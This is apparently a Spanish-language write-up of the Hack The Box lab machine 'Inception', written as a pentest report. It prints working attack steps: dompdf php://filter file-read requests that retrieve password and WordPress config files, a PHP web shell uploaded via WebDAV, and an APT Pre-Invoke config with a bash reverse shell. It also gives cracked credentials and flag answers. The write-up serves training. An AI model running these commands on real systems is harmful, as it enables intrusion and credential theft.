---
title: "Informe Técnico: Inception (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Inception de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/inception/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: Inception

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Inception** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación de servicio de red
* **Vector de Elevación de Privilegios:** Escalada local de privilegios
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Inception |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Linux |
| **Nivel de Dificultad** | Medium |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Explotación de servicio de red |
| **Mecanismo de Escalada** | Escalada local de privilegios |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación de servicio de red
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Escalada local de privilegios
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

**How many TCP ports are listening on Inception?**

R:

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/inception/images/step_01.png)

**Does the Squid proxy require any authentication to use it?**

R: no

![Captura de pantalla 2025-08-29 182145.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/inception/images/step_02.png)

**What is the PHP package in use that has to do with PDFs?**

R: `dompdf`

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/inception/images/step_03.png)

**What version of dompdf is running on Inception?**

R: 0.6.0

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/inception/images/step_04.png)

**What is the 2014 CVE ID for an arbitrary file read vulnerability in dompdf version 0.6.0?**

R: CVE-2014-2383

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/inception/images/step_05.png)

**What is the full path to the authentication file used to secure the webdav test site?**

R: /var/www/html/webdav_test_inception/webdav.passwd

```jsx
curl -k -o htpasswd.pdf '[http://inception.htb/dompdf/dompdf.php?input_file=php://filter/resource=/var/www/html/webdav_test_inception/webdav.passwd&output=1](http://inception.htb/dompdf/dompdf.php?input_file=php://filter/resource=/var/www/html/webdav_test_inception/webdav.passwd&output=1)'
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/inception/images/step_06.png)

**What is the webdav_tester user's password to get to `/webdav_test_inception`?**

R:babygurl69

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/inception/images/step_07.png)

**What user is the Apache site running as?**

R:www-data

```jsx
cat > shell.phtml <<'PHP'
<?php if(isset($_GET['cmd'])){ echo "<pre>"; system($_GET['cmd']); echo "</pre>"; }
PHP
```

```jsx
subir por WebDAV
```

```jsx
curl -k -u USER:PASS -T shell.phtml \
[http://inception.htb/webdav_test_inception/shell.phtml](http://inception.htb/webdav_test_inception/shell.phtml)
```

**What is the root user's password for the wordpress database?**

R: VwPddNh7xMZyDQoByQL4

```jsx
curl -k -o wp_config_b64.pdf '[http://inception.htb/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/wordpress_4.8.3/wp-config.php&output=1](http://inception.htb/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/wordpress_4.8.3/wp-config.php&output=1)'
─ echo "PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUNCiAqIGluc3RhbGxhdGlvbi4gWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbg0KICogY29weSB0aGlzIGZpbGUgdG8gIndwLWNvbmZpZy5waHAiIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vY29kZXgud29yZHByZXNzLm9yZy9FZGl0aW5nX3dwLWNvbmZpZy5waHANCiAqDQogKiBAcGFja2FnZSBXb3JkUHJlc3MNCiAqLw0KDQovLyAqKiBNeVNRTCBzZXR0aW5ncyAtIFlvdSBjYW4gZ2V0IHRoaXMgaW5mbyBmcm9tIHlvdXIgd2ViIGhvc3QgKiogLy8NCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCdEQl9OQU1FJywgJ3dvcmRwcmVzcycpOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSgnREJfVVNFUicsICdyb290Jyk7DQoNCi8qKiBNeVNRTCBkYXRhYmFzZSBwYXNzd29yZCAqLw0KZGVmaW5lKCdEQl9QQVNTV09SRCcsICdWd1BkZE5oN3hNWnlEUW9CeVFMNCcpOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSgnREJfSE9TVCcsICdsb2NhbGhvc3QnKTsNCg0KLyoqIERhdGFiYXNlIENoYXJzZXQgdG8gdXNlIGluIGNyZWF0aW5nIGRhdGFiYXNlIHRhYmxlcy4gKi8NCmRlZmluZSgnREJfQ0hBUlNFVCcsICd1dGY4Jyk7DQoNCi8qKiBUaGUgRGF0YWJhc2UgQ29sbGF0ZSB0eXBlLiBEb24ndCBjaGFuZ2UgdGhpcyBpZiBpbiBkb3VidC4gKi8NCmRlZmluZSgnREJfQ09MTEFURScsICcnKTsNCg0KLyoqI0ArDQogKiBBdXRoZW50aWNhdGlvbiBVbmlxdWUgS2V5cyBhbmQgU2FsdHMuDQogKg0KICogQ2hhbmdlIHRoZXNlIHRvIGRpZmZlcmVudCB1bmlxdWUgcGhyYXNlcyENCiAqIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcgdGhlIHtAbGluayBodHRwczovL2FwaS53b3JkcHJlc3Mub3JnL3NlY3JldC1rZXkvMS4xL3NhbHQvIFdvcmRQcmVzcy5vcmcgc2VjcmV0LWtleSBzZXJ2aWNlfQ0KICogWW91IGNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4gVGhpcyB3aWxsIGZvcmNlIGFsbCB1c2VycyB0byBoYXZlIHRvIGxvZyBpbiBhZ2Fpbi4NCiAqDQogKiBAc2luY2UgMi42LjANCiAqLw0KZGVmaW5lKCdBVVRIX0tFWScsICAgICAgICAgJ3B1dCB5b3VyIHVuaXF1ZSBwaHJhc2UgaGVyZScpOw0KZGVmaW5lKCdTRUNVUkVfQVVUSF9LRVknLCAgJ3B1dCB5b3VyIHVuaXF1ZSBwaHJhc2UgaGVyZScpOw0KZGVmaW5lKCdMT0dHRURfSU5fS0VZJywgICAgJ3B1dCB5b3VyIHVuaXF1ZSBwaHJhc2UgaGVyZScpOw0KZGVmaW5lKCdOT05DRV9LRVknLCAgICAgICAgJ3B1dCB5b3VyIHVuaXF1ZSBwaHJhc2UgaGVyZScpOw0KZGVmaW5lKCdBVVRIX1NBTFQnLCAgICAgICAgJ3B1dCB5b3VyIHVuaXF1ZSBwaHJhc2UgaGVyZScpOw0KZGVmaW5lKCdTRUNVUkVfQVVUSF9TQUxUJywgJ3B1dCB5b3VyIHVuaXF1ZSBwaHJhc2UgaGVyZScpOw0KZGVmaW5lKCdMT0dHRURfSU5fU0FMVCcsICAgJ3B1dCB5b3VyIHVuaXF1ZSBwaHJhc2UgaGVyZScpOw0KZGVmaW5lKCdOT05DRV9TQUxUJywgICAgICAgJ3B1dCB5b3VyIHVuaXF1ZSBwaHJhc2UgaGVyZScpOw0KDQovKiojQC0qLw0KDQovKioNCiAqIFdvcmRQcmVzcyBEYXRhYmFzZSBUYWJsZSBwcmVmaXguDQogKg0KICogWW91IGNhbiBoYXZlIG11bHRpcGxlIGluc3RhbGxhdGlvbnMgaW4gb25lIGRhdGFiYXNlIGlmIHlvdSBnaXZlIGVhY2gNCiAqIGEgdW5pcXVlIHByZWZpeC4gT25seSBudW1iZXJzLCBsZXR0ZXJzLCBhbmQgdW5kZXJzY29yZXMgcGxlYXNlIQ0KICovDQokdGFibGVfcHJlZml4ICA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKg0KICogQ2hhbmdlIHRoaXMgdG8gdHJ1ZSB0byBlbmFibGUgdGhlIGRpc3BsYXkgb2Ygbm90aWNlcyBkdXJpbmcgZGV2ZWxvcG1lbnQuDQogKiBJdCBpcyBzdHJvbmdseSByZWNvbW1lbmRlZCB0aGF0IHBsdWdpbiBhbmQgdGhlbWUgZGV2ZWxvcGVycyB1c2UgV1BfREVCVUcNCiAqIGluIHRoZWlyIGRldmVsb3BtZW50IGVudmlyb25tZW50cy4NCiAqDQogKiBGb3IgaW5mb3JtYXRpb24gb24gb3RoZXIgY29uc3RhbnRzIHRoYXQgY2FuIGJlIHVzZWQgZm9yIGRlYnVnZ2luZywNCiAqIHZpc2l0IHRoZSBDb2RleC4NCiAqDQogKiBAbGluayBodHRwczovL2NvZGV4LndvcmRwcmVzcy5vcmcvRGVidWdnaW5nX2luX1dvcmRQcmVzcw0KICovDQpkZWZpbmUoJ1dQX0RFQlVHJywgZmFsc2UpOw0KDQovKiBUaGF0J3MgYWxsLCBzdG9wIGVkaXRpbmchIEhhcHB5IGJsb2dnaW5nLiAqLw0KDQovKiogQWJzb2x1dGUgcGF0aCB0byB0aGUgV29yZFByZXNzIGRpcmVjdG9yeS4gKi8NCmlmICggIWRlZmluZWQoJ0FCU1BBVEgnKSApDQoJZGVmaW5lKCdBQlNQQVRIJywgZGlybmFtZShfX0ZJTEVfXykgLiAnLycpOw0KDQovKiogU2V0cyB1cCBXb3JkUHJlc3MgdmFycyBhbmQgaW5jbHVkZWQgZmlsZXMuICovDQpyZXF1aXJlX29uY2UoQUJTUEFUSCAuICd3cC1zZXR0aW5ncy5waHAnKTsNCg==" |base64 -d

```

![Captura de pantalla 2025-08-29 195950.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/inception/images/step_08.png)

**What user reused their password for the Wordpress DB?**

R: coob

Submit the flag located in the cobb user's home directory.

R:a0bd89c865652f03d86cec9498274cb2

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/inception/images/step_09.png)

**What UDP-based service is listening on 192.168.0.1 on Inception?**

R: tftp

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/inception/images/step_10.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/inception/images/step_11.png)

**What directory does that `apt` command check for pre-invoke scripts?**

R:  /etc/apt/apt.conf.d/

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/inception/images/step_12.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/inception/images/step_13.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/inception/images/step_14.png)

```jsx
cat > 000-pwn.conf <<'EOF'
> APT::Update::Pre-Invoke {
>   "bash -c 'bash -i >& /dev/tcp/192.168.0.10/9001 0>&1' &";
> };
> EOF

tftp 192.168.0.1
put 000-pwn.conf /etc/apt/apt.conf.d/000-pwn.conf
```

**Submit the flag located in the root user's home directory.**

R: 1ed67cc6a1aea2710b4a2d4d68481045

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/inception/images/step_15.png)

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
